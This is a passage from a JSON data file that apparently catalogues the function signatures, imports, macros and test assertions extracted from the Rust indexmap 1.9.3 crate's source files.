          "fn shrink(&self) -> Box<dyn Iterator<Item = Self>> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::{IndexMap, IndexSet};",
          "use arbitrary::{Arbitrary, Result, Unstructured};",
          "use core::hash::{BuildHasher, Hash};",
          "use crate::{IndexMap, IndexSet};",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use core::hash::{BuildHasher, Hash};",
          "use quickcheck::{Arbitrary, Gen};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/util.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::ops::{Bound, Range, RangeBounds};"
        ],
        "macros": [
          "bound => panic!(\"range start {:?} should be <= length {}\", bound, len),",
          "bound => panic!(\"range end {:?} should be <= length {}\", bound, len),",
          "panic!("
        ],
        "derives": [],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/serde.rs",
        "function_defs": [
          "fn serialize<T>(&self, serializer: T) -> Result<T::Ok, T::Error>",
          "fn expecting(&self, formatter: &mut Formatter<'_>) -> fmt::Result {",
          "fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn into_deserializer(self) -> Self::Deserializer {",
          "fn serialize<Se>(&self, serializer: Se) -> Result<Se::Ok, Se::Error>",
          "fn expecting(&self, formatter: &mut Formatter<'_>) -> fmt::Result {",
          "fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn into_deserializer(self) -> Self::Deserializer {"
        ],
        "struct_defs": [
          "struct IndexMapVisitor<K, V, S>(PhantomData<(K, V, S)>);",
          "struct IndexSetVisitor<T, S>(PhantomData<(T, S)>);"
        ],
        "impl_blocks": [],
        "uses": [
          "use serde::de::value::{MapDeserializer, SeqDeserializer};",
          "use serde::de::{",
          "use serde::ser::{Serialize, Serializer};",
          "use core::fmt::{self, Formatter};",
          "use core::hash::{BuildHasher, Hash};",
          "use core::marker::PhantomData;",
          "use crate::IndexMap;",
          "use crate::IndexSet;"
        ],
        "macros": [
          "write!(formatter, \"a map\")",
          "write!(formatter, \"a set\")"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/mutable_keys.rs",
        "function_defs": [
          "fn get_full_mut2<Q: ?Sized>(",
          "fn retain2<F>(&mut self, keep: F)",
          "fn __private_marker(&self) -> PrivateMarker;",
          "fn get_full_mut2<Q: ?Sized>(&mut self, key: &Q) -> Option<(usize, &mut K, &mut V)>",
          "fn retain2<F>(&mut self, keep: F)",
          "fn __private_marker(&self) -> PrivateMarker {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::hash::{BuildHasher, Hash};",
          "use super::{Equivalent, IndexMap};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/lib.rs",
        "function_defs": [
          "fn get(self) -> u64 {",
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, other: &Self) {",
          "fn key_ref(&self) -> &K {",
          "fn value_ref(&self) -> &V {",
          "fn value_mut(&mut self) -> &mut V {",
          "fn key(self) -> K {",
          "fn value(self) -> V {",
          "fn key_value(self) -> (K, V) {",
          "fn refs(&self) -> (&K, &V) {",
          "fn ref_mut(&mut self) -> (&K, &mut V) {",
          "fn muts(&mut self) -> (&mut K, &mut V) {",
          "fn into_entries(self) -> Vec<Self::Entry>;",
          "fn as_entries(&self) -> &[Self::Entry];",
          "fn as_entries_mut(&mut self) -> &mut [Self::Entry];",
          "fn with_entries<F>(&mut self, f: F)"
        ],
        "struct_defs": [
          "struct HashValue(usize);",
          "struct Bucket<K, V> {"
        ],
        "impl_blocks": [
          "impl HashValue {"
        ],
        "uses": [
          "use alloc::vec::{self, Vec};"
        ],
        "macros": [
          "//! assert_eq!(std, fnv);",
          "//! assert_eq!(std, fx);"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, PartialEq)]",
          "#[derive(Copy, Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/serde_seq.rs",
        "function_defs": [
          "fn expecting(&self, formatter: &mut Formatter<'_>) -> fmt::Result {",
          "fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>"
        ],
        "struct_defs": [
          "struct SeqVisitor<K, V, S>(PhantomData<(K, V, S)>);"
        ],
        "impl_blocks": [],
        "uses": [
          "use serde::de::{Deserialize, Deserializer, SeqAccess, Visitor};",
          "use serde::ser::{Serialize, Serializer};",
          "use core::fmt::{self, Formatter};",
          "use core::hash::{BuildHasher, Hash};",
          "use core::marker::PhantomData;",
          "use crate::IndexMap;"
        ],
        "macros": [
          "write!(formatter, \"a sequenced map\")"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/set.rs",
        "function_defs": [
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, other: &Self) {",
          "fn into_entries(self) -> Vec<Self::Entry> {",
          "fn as_entries(&self) -> &[Self::Entry] {",
          "fn as_entries_mut(&mut self) -> &mut [Self::Entry] {",
          "fn with_entries<F>(&mut self, f: F)",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn index(&self, index: usize) -> &T {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn from_iter<I: IntoIterator<Item = T>>(iterable: I) -> Self {",
          "fn from(arr: [T; N]) -> Self {",
          "fn extend<I: IntoIterator<Item = T>>(&mut self, iterable: I) {",
          "fn extend<I: IntoIterator<Item = &'a T>>(&mut self, iterable: I) {",
          "fn default() -> Self {",
          "fn eq(&self, other: &IndexSet<T, S2>) -> bool {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn fold<B, F>(self, init: B, f: F) -> B",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn rfold<B, F>(self, init: B, f: F) -> B",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn fold<B, F>(self, init: B, f: F) -> B",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn rfold<B, F>(self, init: B, f: F) -> B",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn bitand(self, other: &IndexSet<T, S2>) -> Self::Output {",
          "fn bitor(self, other: &IndexSet<T, S2>) -> Self::Output {",
          "fn bitxor(self, other: &IndexSet<T, S2>) -> Self::Output {",
          "fn sub(self, other: &IndexSet<T, S2>) -> Self::Output {",
          "fn it_works() {",
          "fn new() {",
          "fn insert() {",
          "fn insert_full() {",
          "fn insert_2() {",
          "fn insert_dup() {",
          "fn insert_order() {",
          "fn replace() {",
          "fn replace_full() {",
          "fn replace_2() {",
          "fn replace_dup() {",
          "fn replace_order() {",
          "fn grow() {",
          "fn reserve() {",
          "fn shrink_to_fit() {",
          "fn remove() {",
          "fn swap_remove_index() {",
          "fn partial_eq_and_eq() {",
          "fn extend() {",
          "fn comparisons() {",
          "fn iter_comparisons() {",
          "fn check<'a, I1, I2>(iter1: I1, iter2: I2)",
          "fn ops() {",
          "fn from_array() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::collections::hash_map::RandomState;",
          "use crate::vec::{self, Vec};",
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::iter::{Chain, FusedIterator};",
          "use core::ops::{BitAnd, BitOr, BitXor, Index, RangeBounds, Sub};",
          "use core::slice;",
          "use super::{Entries, Equivalent, IndexMap};",
          "use super::map::Entry::*;",
          "use super::map::Entry::*;",
          "use super::*;",
          "use std::string::String;",
          "use std::iter::empty;"
        ],
        "macros": [
          "/// assert!(letters.contains(&'s'));",
          "/// assert!(letters.contains(&'t'));",
          "/// assert!(letters.contains(&'u'));",
          "/// assert!(!letters.contains(&'y'));",
          "if cfg!(not(feature = \"test_debug\")) {",
          "/// assert_eq!(set[0], \"Lorem\");",
          "/// assert_eq!(set[1], \"ipsum\");",
          "/// assert_eq!(set[0], \"amet\");",
          "/// assert_eq!(set[1], \"sit\");",
          "/// assert_eq!(set[0], \"Lorem\");",
          "/// assert_eq!(set[1], \"amet\");",
          "/// println!(\"{:?}\", set[10]); // panics!",
          "iterator_methods!(Bucket::key);",
          "double_ended_iterator_methods!(Bucket::key);",
          "iterator_methods!(Bucket::key_ref);",
          "double_ended_iterator_methods!(Bucket::key_ref);",
          "iterator_methods!(Bucket::key);",
          "double_ended_iterator_methods!(Bucket::key);",
          "/// assert_eq!(set1, set2);",
          "assert_eq!(set.is_empty(), true);",
          "assert_eq!(set.len(), 1);",
          "assert!(set.get(&1).is_some());",
          "assert_eq!(set.is_empty(), false);",
          "println!(\"{:?}\", set);",
          "assert_eq!(set.capacity(), 0);",
          "assert_eq!(set.len(), 0);",
          "assert_eq!(set.is_empty(), true);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.get(&elt), Some(&elt));",
          "println!(\"{:?}\", set);",
          "assert!(set.get(&elt).is_none());",
          "assert_eq!(set.len(), i);",
          "assert!(success);",
          "assert_eq!(Some(index), set.get_full(&elt).map(|x| x.0));",
          "assert_eq!(set.len(), i + 1);",
          "assert!(!success);",
          "assert_eq!(Some(index), set.get_full(&elt).map(|x| x.0));",
          "assert_eq!(set.len(), len);",
          "values.extend(if cfg!(miri) { 32..64 } else { 128..267 });",
          "println!(\"old_set: {:?}\", old_set);",
          "println!(\"set: {:?}\", set);",
          "panic!(\"did not find {} in set\", value);",
          "assert!(set.get(&i).is_some(), \"did not find {}\", i);",
          "assert_eq!(set.len(), 5);",
          "assert_eq!(i, 0);",
          "assert_eq!(*v, 0);",
          "assert_eq!(set.len(), 5);",
          "assert_eq!(inserted, false);",
          "assert_eq!(i, 0);",
          "assert_eq!(*v, 0);",
          "assert_eq!(set.iter().count(), set.len());",
          "assert_eq!(set.iter().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set.get_index(i).unwrap(), v);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.get(&elt), Some(&elt));",
          "println!(\"{:?}\", set);",
          "assert!(set.get(&elt).is_none());",
          "assert_eq!(set.len(), i);",
          "assert!(replaced.is_none());",
          "assert_eq!(Some(index), set.get_full(&elt).map(|x| x.0));",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(Some(elt), replaced);",
          "assert_eq!(Some(index), set.get_full(&elt).map(|x| x.0));",
          "assert_eq!(set.len(), len);",
          "values.extend(if cfg!(miri) { 32..64 } else { 128..267 });",
          "println!(\"old_set: {:?}\", old_set);",
          "println!(\"set: {:?}\", set);",
          "panic!(\"did not find {} in set\", value);",
          "assert!(set.get(&i).is_some(), \"did not find {}\", i);",
          "assert_eq!(set.len(), 5);",
          "assert_eq!(i, 0);",
          "assert_eq!(*v, 0);",
          "assert_eq!(set.len(), 5);",
          "assert_eq!(replaced, Some(0));",
          "assert_eq!(i, 0);",
          "assert_eq!(*v, 0);",
          "assert_eq!(set.iter().count(), set.len());",
          "assert_eq!(set.iter().count(), replace.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set.get_index(i).unwrap(), v);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.get(&elt), Some(&elt));",
          "println!(\"{:?}\", set);",
          "println!(\"{:?}\", set);",
          "assert!(set.get(&elt).is_none());",
          "assert_eq!(set.capacity(), 0);",
          "assert!(capacity >= 100);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.capacity(), capacity);",
          "assert_eq!(set.get(&i), Some(&i));",
          "assert_eq!(set.len(), capacity + 1);",
          "assert!(set.capacity() > capacity);",
          "assert_eq!(set.get(&capacity), Some(&capacity));",
          "assert_eq!(set.capacity(), 0);",
          "assert_eq!(set.len(), i);",
          "assert_eq!(set.len(), i + 1);",
          "assert!(set.capacity() >= i + 1);",
          "assert_eq!(set.get(&i), Some(&i));",
          "assert_eq!(set.len(), i + 1);",
          "assert_eq!(set.capacity(), i + 1);",
          "assert_eq!(set.get(&i), Some(&i));",
          "assert_eq!(set.iter().count(), set.len());",
          "assert_eq!(set.iter().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert!(set.swap_remove_full(&value).is_none());",
          "println!(\"{:?}\", set);",
          "//println!(\"{:?}\", set);",
          "assert_eq!(set.swap_remove_full(&value), Some((index, value)));",
          "println!(\"{:?}\", set);",
          "assert_eq!(set.get(value).is_some(), !remove.contains(value));",
          "assert_eq!(set.len(), insert.len() - remove.len());",
          "assert_eq!(set.iter().count(), insert.len() - remove.len());",
          "assert_eq!(out_vec, out_set);",
          "assert_eq!(vector.len(), set.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set_a, set_b);",
          "assert_ne!(set_a, set_b);",
          "assert_ne!(set_a, set_c);",
          "assert_ne!(set_c, set_a);",
          "assert_eq!(set.into_iter().collect::<Vec<_>>(), vec![1, 2, 3, 4, 5, 6]);",
          "assert!(!set_a.is_disjoint(&set_a));",
          "assert!(set_a.is_subset(&set_a));",
          "assert!(set_a.is_superset(&set_a));",
          "assert!(set_a.is_disjoint(&set_b));",
          "assert!(set_b.is_disjoint(&set_a));",
          "assert!(!set_a.is_subset(&set_b));",
          "assert!(!set_b.is_subset(&set_a));",
          "assert!(!set_a.is_superset(&set_b));",
          "assert!(!set_b.is_superset(&set_a));",
          "assert!(!set_a.is_disjoint(&set_c));",
          "assert!(!set_c.is_disjoint(&set_a));",
          "assert!(set_a.is_subset(&set_c));",
          "assert!(!set_c.is_subset(&set_a));",
          "assert!(!set_a.is_superset(&set_c));",
          "assert!(set_c.is_superset(&set_a));",
          "assert!(!set_c.is_disjoint(&set_d));",
          "assert!(!set_d.is_disjoint(&set_c));",
          "assert!(!set_c.is_subset(&set_d));",
          "assert!(!set_d.is_subset(&set_c));",
          "assert!(!set_c.is_superset(&set_d));",
          "assert!(!set_d.is_superset(&set_c));",
          "assert!(iter1.copied().eq(iter2));",
          "assert_eq!(&set_a & &set_a, set_a);",
          "assert_eq!(&set_a | &set_a, set_a);",
          "assert_eq!(&set_a ^ &set_a, empty);",
          "assert_eq!(&set_a - &set_a, empty);",
          "assert_eq!(&set_a & &set_b, empty);",
          "assert_eq!(&set_b & &set_a, empty);",
          "assert_eq!(&set_a | &set_b, set_c);",
          "assert_eq!(&set_b | &set_a, set_c);",
          "assert_eq!(&set_a ^ &set_b, set_c);",
          "assert_eq!(&set_b ^ &set_a, set_c);",
          "assert_eq!(&set_a - &set_b, set_a);",
          "assert_eq!(&set_b - &set_a, set_b);",
          "assert_eq!(&set_a & &set_c, set_a);",
          "assert_eq!(&set_c & &set_a, set_a);",
          "assert_eq!(&set_a | &set_c, set_c);",
          "assert_eq!(&set_c | &set_a, set_c);",
          "assert_eq!(&set_a ^ &set_c, set_b);",
          "assert_eq!(&set_c ^ &set_a, set_b);",
          "assert_eq!(&set_a - &set_c, empty);",
          "assert_eq!(&set_c - &set_a, set_b);",
          "assert_eq!(&set_c & &set_d, set_b);",
          "assert_eq!(&set_d & &set_c, set_b);",
          "assert_eq!(&set_c | &set_d, &set_a | &set_d);",
          "assert_eq!(&set_d | &set_c, &set_a | &set_d);",
          "assert_eq!(&set_c ^ &set_d, &set_a | &(&set_d - &set_b));",
          "assert_eq!(&set_d ^ &set_c, &set_a | &(&set_d - &set_b));",
          "assert_eq!(&set_c - &set_d, set_a);",
          "assert_eq!(&set_d - &set_c, &set_d - &set_b);",
          "assert_eq!(set1, set2);"
        ],
        "derives": [],
        "error_handling": 35
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/macros.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn count(self) -> usize {",
          "fn nth(&mut self, n: usize) -> Option<Self::Item> {",
          "fn last(mut self) -> Option<Self::Item> {",
          "fn collect<C>(self) -> C",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn nth_back(&mut self, n: usize) -> Option<Self::Item> {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn opt_len(&self) -> Option<usize> {",
          "fn drive<C>(self, consumer: C) -> C::Result",
          "fn len(&self) -> usize {",
          "fn with_producer<CB>(self, callback: CB) -> CB::Output"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "/// assert_eq!(map[\"a\"], 1);",
          "/// assert_eq!(map[\"b\"], 2);",
          "/// assert_eq!(map.get(\"c\"), None);",
          "/// assert_eq!(map.keys().next(), Some(&\"a\"));",
          "(@count $($rest:expr),*) => (<[()]>::len(&[$($crate::indexmap!(@single $rest)),*",
          "($($key:expr => $value:expr,)+) => { $crate::indexmap!($($key => $value),+) };",
          "let _cap = $crate::indexmap!(@count $($key),*);",
          "/// assert!(set.contains(\"a\"));",
          "/// assert!(set.contains(\"b\"));",
          "/// assert!(!set.contains(\"c\"));",
          "/// assert_eq!(set.iter().next(), Some(&\"a\"));",
          "(@count $($rest:expr),*) => (<[()]>::len(&[$($crate::indexset!(@single $rest)),*",
          "($($value:expr,)+) => { $crate::indexset!($($value),+) };",
          "let _cap = $crate::indexset!(@count $($value),*);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/map.rs",
        "function_defs": [
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, other: &Self) {",
          "fn into_entries(self) -> Vec<Self::Entry> {",
          "fn as_entries(&self) -> &[Self::Entry] {",
          "fn as_entries_mut(&mut self) -> &mut [Self::Entry] {",
          "fn with_entries<F>(&mut self, f: F)",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn hash<Q: ?Sized + Hash>(&self, key: &Q) -> HashValue {",
          "fn len(&self) -> usize {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn len(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn index(&self, key: &Q) -> &V {",
          "fn index_mut(&mut self, key: &Q) -> &mut V {",
          "fn index(&self, index: usize) -> &V {",
          "fn index_mut(&mut self, index: usize) -> &mut V {",
          "fn from_iter<I: IntoIterator<Item = (K, V)>>(iterable: I) -> Self {",
          "fn from(arr: [(K, V); N]) -> Self {",
          "fn extend<I: IntoIterator<Item = (K, V)>>(&mut self, iterable: I) {",
          "fn extend<I: IntoIterator<Item = (&'a K, &'a V)>>(&mut self, iterable: I) {",
          "fn default() -> Self {",
          "fn eq(&self, other: &IndexMap<K, V2, S2>) -> bool {",
          "fn it_works() {",
          "fn new() {",
          "fn insert() {",
          "fn insert_full() {",
          "fn insert_2() {",
          "fn insert_order() {",
          "fn grow() {",
          "fn reserve() {",
          "fn shrink_to_fit() {",
          "fn remove() {",
          "fn remove_to_empty() {",
          "fn swap_remove_index() {",
          "fn partial_eq_and_eq() {",
          "fn extend() {",
          "fn entry() {",
          "fn entry_and_modify() {",
          "fn entry_or_default() {",
          "fn default() -> Self {",
          "fn occupied_entry_key() {",
          "fn keys() {",
          "fn into_keys() {",
          "fn values() {",
          "fn values_mut() {",
          "fn into_values() {",
          "fn from_array() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Default for TestEnum {"
        ],
        "uses": [
          "use crate::vec::{self, Vec};",
          "use ::core::cmp::Ordering;",
          "use ::core::fmt;",
          "use ::core::hash::{BuildHasher, Hash, Hasher};",
          "use ::core::iter::FusedIterator;",
          "use ::core::ops::{Index, IndexMut, RangeBounds};",
          "use ::core::slice::{Iter as SliceIter, IterMut as SliceIterMut};",
          "use std::collections::hash_map::RandomState;",
          "use self::core::IndexMapCore;",
          "use crate::equivalent::Equivalent;",
          "use crate::util::third;",
          "use crate::{Bucket, Entries, HashValue};",
          "use super::*;",
          "use std::string::String;"
        ],
        "macros": [
          "/// assert_eq!(letters[&'s'], 2);",
          "/// assert_eq!(letters[&'t'], 3);",
          "/// assert_eq!(letters[&'u'], 1);",
          "/// assert_eq!(letters.get(&'y'), None);",
          "if cfg!(not(feature = \"test_debug\")) {",
          "iterator_methods!(Bucket::key_ref);",
          "double_ended_iterator_methods!(Bucket::key_ref);",
          "iterator_methods!(Bucket::key);",
          "double_ended_iterator_methods!(Bucket::key);",
          "iterator_methods!(Bucket::value_ref);",
          "double_ended_iterator_methods!(Bucket::value_ref);",
          "iterator_methods!(Bucket::value_mut);",
          "double_ended_iterator_methods!(Bucket::value_mut);",
          "iterator_methods!(Bucket::value);",
          "double_ended_iterator_methods!(Bucket::value);",
          "iterator_methods!(Bucket::refs);",
          "double_ended_iterator_methods!(Bucket::refs);",
          "iterator_methods!(Bucket::ref_mut);",
          "double_ended_iterator_methods!(Bucket::ref_mut);",
          "iterator_methods!(Bucket::key_value);",
          "double_ended_iterator_methods!(Bucket::key_value);",
          "iterator_methods!(Bucket::key_value);",
          "double_ended_iterator_methods!(Bucket::key_value);",
          "/// assert_eq!(map[\"lorem\"], \"LOREM\");",
          "/// assert_eq!(map[\"ipsum\"], \"IPSUM\");",
          "/// println!(\"{:?}\", map[\"bar\"]); // panics!",
          "/// assert_eq!(lorem, \"Lorem\");",
          "/// assert_eq!(map[\"lorem\"], \"orem\");",
          "/// assert_eq!(map[0], \"LOREM\");",
          "/// assert_eq!(map[1], \"IPSUM\");",
          "/// assert_eq!(map[0], \"AMET\");",
          "/// assert_eq!(map[1], \"SIT\");",
          "/// assert_eq!(map[0], \"AMET\");",
          "/// assert_eq!(map[1], \"DOLOR\");",
          "/// println!(\"{:?}\", map[10]); // panics!",
          "/// assert_eq!(lorem, \"Lorem\");",
          "/// assert_eq!(map[\"lorem\"], \"orem\");",
          "/// assert_eq!(map1, map2);",
          "assert_eq!(map.is_empty(), true);",
          "assert_eq!(map.len(), 1);",
          "assert!(map.get(&1).is_some());",
          "assert_eq!(map.is_empty(), false);",
          "println!(\"{:?}\", map);",
          "assert_eq!(map.capacity(), 0);",
          "assert_eq!(map.len(), 0);",
          "assert_eq!(map.is_empty(), true);",
          "assert_eq!(map.len(), i);",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(map.get(&elt), Some(&elt));",
          "assert_eq!(map[&elt], elt);",
          "println!(\"{:?}\", map);",
          "assert!(map.get(&elt).is_none());",
          "assert_eq!(map.len(), i);",
          "assert_eq!(existing, None);",
          "assert_eq!(Some(index), map.get_full(&elt).map(|x| x.0));",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(existing, Some(elt));",
          "assert_eq!(Some(index), map.get_full(&elt).map(|x| x.0));",
          "assert_eq!(map.len(), len);",
          "keys.extend(if cfg!(miri) { 32..64 } else { 128..267 });",
          "println!(\"old_map: {:?}\", old_map);",
          "println!(\"map: {:?}\", map);",
          "panic!(\"did not find {} in map\", key);",
          "assert!(map.get(&i).is_some(), \"did not find {}\", i);",
          "assert_eq!(map.keys().count(), map.len());",
          "assert_eq!(map.keys().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(map.get_index(i).unwrap().0, k);",
          "assert_eq!(map.len(), i);",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(map.get(&elt), Some(&elt));",
          "assert_eq!(map[&elt], elt);",
          "println!(\"{:?}\", map);",
          "println!(\"{:?}\", map);",
          "assert!(map.get(&elt).is_none());",
          "assert_eq!(map.capacity(), 0);",
          "assert!(capacity >= 100);",
          "assert_eq!(map.len(), i);",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(map.capacity(), capacity);",
          "assert_eq!(map.get(&i), Some(&(i * i)));",
          "assert_eq!(map.len(), capacity + 1);",
          "assert!(map.capacity() > capacity);",
          "assert_eq!(map.get(&capacity), Some(&std::usize::MAX));",
          "assert_eq!(map.capacity(), 0);",
          "assert_eq!(map.len(), i);",
          "assert_eq!(map.len(), i + 1);",
          "assert!(map.capacity() >= i + 1);",
          "assert_eq!(map.get(&i), Some(&(i * i)));",
          "assert_eq!(map.len(), i + 1);",
          "assert_eq!(map.capacity(), i + 1);",
          "assert_eq!(map.get(&i), Some(&(i * i)));",
          "assert_eq!(map.keys().count(), map.len());",
          "assert_eq!(map.keys().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert!(map.swap_remove_full(&key).is_none());",
          "println!(\"{:?}\", map);",
          "//println!(\"{:?}\", map);",
          "assert_eq!(map.swap_remove_full(&key), Some((index, key, key)));",
          "println!(\"{:?}\", map);",
          "assert_eq!(map.get(key).is_some(), !remove.contains(key));",
          "assert_eq!(map.len(), insert.len() - remove.len());",
          "assert_eq!(map.keys().count(), insert.len() - remove.len());",
          "assert!(map.is_empty());",
          "assert_eq!(out_vec, out_map);",
          "assert_eq!(vector.len(), map.len());",
          "assert_eq!(a, b);",
          "assert_eq!(map_a, map_b);",
          "assert_ne!(map_a, map_b);",
          "assert_ne!(map_a, map_c);",
          "assert_ne!(map_c, map_a);",
          "assert_eq!(",
          "assert_eq!(e.index(), 2);",
          "assert_eq!(e, &\"3\");",
          "assert_eq!(e.index(), 1);",
          "assert_eq!(e.key(), &2);",
          "Entry::Occupied(ref e) => assert_eq!(e.get(), &\"2\"),",
          "Entry::Vacant(_) => panic!(),",
          "assert_eq!(e.or_insert(\"4\"), &\"2\");",
          "assert_eq!(Some(&\"2\"), map.get(&1));",
          "assert_eq!(None, map.get(&2));",
          "assert_eq!(&mut TestEnum::NonDefaultValue, map.entry(1).or_default());",
          "assert_eq!(&mut TestEnum::DefaultValue, map.entry(2).or_default());",
          "assert_ne!(k1_ptr, k2_ptr);",
          "assert_eq!(ptr, k1_ptr);",
          "assert_ne!(ptr, k2_ptr);",
          "Entry::Vacant(_) => panic!(),",
          "assert_eq!(keys.len(), 3);",
          "assert!(keys.contains(&1));",
          "assert!(keys.contains(&2));",
          "assert!(keys.contains(&3));",
          "assert_eq!(keys.len(), 3);",
          "assert!(keys.contains(&1));",
          "assert!(keys.contains(&2));",
          "assert!(keys.contains(&3));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&'a'));",
          "assert!(values.contains(&'b'));",
          "assert!(values.contains(&'c'));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&2));",
          "assert!(values.contains(&4));",
          "assert!(values.contains(&6));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&'a'));",
          "assert!(values.contains(&'b'));",
          "assert!(values.contains(&'c'));",
          "assert_eq!(map, expected)"
        ],
        "derives": [
          "#[derive(Debug, PartialEq)]"
        ],
        "error_handling": 41
      },
      {
